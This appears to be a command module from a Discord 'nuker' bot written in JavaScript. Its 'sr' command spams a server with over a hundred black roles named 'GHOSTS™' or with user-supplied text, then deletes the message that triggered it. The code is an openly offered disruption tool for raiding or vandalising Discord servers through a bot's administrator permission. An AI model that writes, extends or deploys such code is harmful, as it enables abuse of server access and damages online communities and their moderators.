const Discord = require('discord.js')
const chalk = require('chalk')

module.exports = {
    name: 'sr',
    description: 'spams roles',
    run: async(nuker, message, args) => {
        if(!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(chalk.grey("ERROR: MISSING ADMINISTRATOR PERMISSION!"))
        const text = args.join(' ')
        if(!text) {
                for (let i = 0; i <= 250; i++) {
                    message.guild.roles.create({
                        data: {
                            name: "GHOSTS™",
                            position: i++,
                            color: "BLACK"
                        }
                    }).then(console.log(chalk.yellowBright("SPAMMING ROLES")))
                }
            message.delete()
        } else {
                for (let i = 0; i <= 250; i++) {
                    message.guild.roles.create({
                        data: {
                            name: `${text}`,
                            position: i++,
                            color: "BLACK"
                        }
                    }).then(console.log(chalk.yellowBright("SPAMMING ROLES")))
                }
            message.delete()
        }
    }
}
